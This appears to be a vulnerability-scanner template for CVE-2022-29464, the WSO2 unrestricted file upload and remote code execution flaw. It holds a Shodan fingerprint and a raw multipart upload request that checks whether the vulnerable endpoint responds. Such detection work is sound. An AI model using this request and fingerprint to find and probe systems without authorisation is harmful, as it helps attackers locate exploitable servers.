id: CVE-2022-29464

info:
  name: WSO2 Management - Unrestricted Arbitrary File Upload & Remote Code Execution
  author: luci
  severity: critical
  description: |
    Certain WSO2 products allow unrestricted file upload with resultant remote code execution. This affects WSO2 API Manager 2.2.0 and above through 4.0.0; WSO2 Identity Server 5.2.0 and above through 5.11.0; WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, and 5.6.0; WSO2 Identity Server as Key Manager 5.3.0 and above through 5.10.0; and WSO2 Enterprise Integrator 6.2.0 and above through 6.6.0.
  reference:
    - https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738
  metadata:
    shodan-query: http.favicon.hash:1398055326
  tags: cve,cve2022,rce,fileupload,wso2

requests:
  - raw:
      - |
        POST /fileupload/jarZip HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data;boundary=------------------------829fca8cb9f01750

        --------------------------829fca8cb9f01750

        Content-Disposition: form-data; name="file";
        filename="DefaultCharts.zip"
        Content-Type: application/octet-stream


        --------------------------829fca8cb9f01750--

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "top.jarZipFileUploadExecutor"
          - "Please upload a jar"
        condition: and

      - type: status
        status:
          - 200
